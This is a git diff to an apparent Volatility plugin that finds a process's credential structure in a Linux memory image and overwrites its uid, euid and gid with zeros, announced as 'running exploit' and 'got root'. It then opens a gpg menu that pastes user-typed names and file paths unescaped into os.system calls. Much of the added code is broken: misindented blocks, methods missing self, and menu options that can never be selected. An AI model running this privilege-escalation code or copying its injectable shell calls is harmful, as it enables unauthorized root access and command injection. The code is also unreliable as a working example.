@@ -8,6 +8,7 @@ import volatility.plugins.taskmods as taskmods
 import volatility.plugins.linux.common as linux_common
 import subprocess as sp
 import re
+from charInput import readIn
 from volatility.renderers import TreeGrid
 from volatility.renderers.basic import Address
 from subprocess import Popen, PIPE
@@ -45,7 +46,7 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
         '''return dict containing uid and euid mem locations '''
         cmd = 'echo \"cc(pid='+str(pid)+'); dt(\\\"cred\\\",proc().cred)\" | python vol.py --profile='+str(_prof)+' -f '+str(_loc)+' linux_volshell'
         cmd = cmd.replace("%20", "\\ ")
-        print cmd
+        # print cmd
         output = ""
         err = ""
         exit_code = ""
@@ -57,19 +58,16 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
             print "Error:"
             print err
         # Handle error here
-        else:
+        # else:
         # Be happy :D
-            print "Output:"
-            print output
-            print "Error:"
-            print err
+        # print output
         res = output
         rtn = {}
         rtn['pid'] = str(pid)
         u = re.compile('\\b\uid\\b')
         e = re.compile('\\b\euid\\b')
         g = re.compile('\\b\gid\\b')
-        print(res)
+        # print(res)
         for line in res.split('\n'):
             if u.search(line):
                 rtn['uid'] = line.split()[3]
@@ -90,7 +88,7 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
         cmd = 'echo \"Yes, I want to enable write support\nself._addrspace.write({uid},\'{zeros}\'); self._addrspace.write({euid},\'{zeros}\'); self._addrspace.write({gid},\'{zeros}\')\" | python vol.py --profile={prof} -f {loc} linux_volshell --write'.format(uid=uid,zeros=zeros,euid=euid, prof=_prof,loc=_loc, pid=pid, gid=gid)
         cmd = cmd.replace("%20", "\\ ")
 
-        print cmd
+        # print cmd
         output, err, exit_code = self.run(cmd)
 
         if exit_code != 0:
@@ -98,10 +96,12 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
             print output
             print "Error:"
             print err
+            return False
+
         # Handle error here
-        else:
+        # else:
         # Be happy :D
-            print output
+            # print output
         res = output
         rtn = True
         return rtn
@@ -198,7 +198,56 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                        Address(dtb),
                        start_time])
 
+    def skull():
+        print('''
+                             uuuuuuu
+                         uu$$$$$$$$$$$uu
+                      uu$$$$$$$$$$$$$$$$$uu
+                     u$$$$$$$$$$$$$$$$$$$$$u
+                    u$$$$$$$$$$$$$$$$$$$$$$$u
+                   u$$$$$$$$$$$$$$$$$$$$$$$$$u
+                   u$$$$$$$$$$$$$$$$$$$$$$$$$u
+                   u$$$$$$"   "$$$"   "$$$$$$u
+                   "$$$$"      u$u       $$$$"
+                    $$$u       u$u       u$$$
+                    $$$u      u$$$u      u$$$
+                     "$$$$uu$$$   $$$uu$$$$"
+                      "$$$$$$$"   "$$$$$$$"
+                        u$$$$$$$u$$$$$$$u
+                         u$"$"$"$"$"$"$u
+         u$u.            $$u$ $ $ $ $u$$            .u$u
+        .u$$$$uu.         $$$$$u$u$u$$$         .uu$$$$u.
+       .u$""u$$u$$u.       "$$$$$$$$$"       .u$$u$$u""$u.
+      .uu  .u$"  "u$$$u       """""       u$$$u"  "$u.  uu.
+          "u"        u$$$u.           .u$$$u        "u"
+                        "$$$u.     .u$$$"
+                            "$$$u. """
+           .uuuu.         .uuu. "$$$u.         .uuuu.
+          u"    "u.   .u$$$""      ""$$$u.   .u"    "u
+          .u    .u$uu$$""              ""$$uu$u.    .u
+        ."u$$uu$$$$uu.                    .uu$$$$uu$$u".
+       .u"   "u$$"   "$u                u$"   "$$u"   "u.
+        $.    .uu.    .u                u.    .uu.    .$
+         "u..u"  "u..u"                  "u..u"  "u..u"
 
+
+                     Welcome to Vol-Key
+        ''')
+    def keyMenu():
+        print("""
+    1. Make Key
+    e. Exit
+        """)
+
+    def readIn(validSelec):
+    while(1):
+        temp = readchar.readkey()
+        if len(temp) ==1: #this will ignore special keys that require >1 byte (arrow keys, modifiers,ect.)
+            if temp in validSelec:
+                time.sleep(.2) #added a sleep by request of tester who said it was "too quick"
+                return temp
+    print("fatal flaw on read")
+    sys.exit(2) #error code 2 for standard input error code                                                                                    
     def render_text(self, outfd, data):
         self.table_header(outfd, [("Offset", "[addrpad]"),
                                   ("Name", "20"),
@@ -220,9 +269,47 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                                str(gid),
                                dtb,
                                str(start_time))
+                print "running exploit..."
                 vals = self._get_cred_offsets_brute(task.pid)
-                print vals
+                # print vals
                 success = self._overwrite_UIDs(vals)
+                if success:
+                    print "got root...probably"
+                    skull();
+                    keyMenu();
+                    print("select an option:")
+                    keySelec = ['e','1']
+                    ans=readIn(keySelec)
+                    print("option selected: "+ans+"\n")
+                            if ans=="1": # generate keys    
+                                os.system("gpg --gen-key")
+                                #os.system("ls; exec bash") to leave the shell open
+                            elif ans=="2": # list keys
+                                os.system("gpg --list-keys")
+                            elif ans=="3": # delete key
+                                username=raw_input("Whose key would you like to remove from your keyring?\n")
+                                os.system('gpg --delete-key "'+username+'"')
+                            elif ans=="4": # delete secret key
+                                os.system("gpg --list-secret-keys")
+                                username=raw_input("Whose secret key would you like to remove from your secret keyring?\n")
+                                os.system('gpg --delete-secret-key "'+username+'"')
+                            elif ans=="5": # export key
+                                username=raw_input("Enter Username/ID associated with key:\n")
+                                file=username.replace(" ", "")
+                                os.system('gpg --export -a "'+username+'" > '+file+'.key')
+                            elif ans=="6": # import key
+                                os.system("ls *.key")
+                                file=raw_input("From which file would you like to import the key?\n")
+                                os.system("gpg --import "+file) 
+                            elif ans=="e":
+                                print("\n Goodbye")
+                                ans=None
+                            elif ans=="<":
+                                pass
+                            else:
+                                print("\n Pick a Real Option.") 
+
+
 
 
   
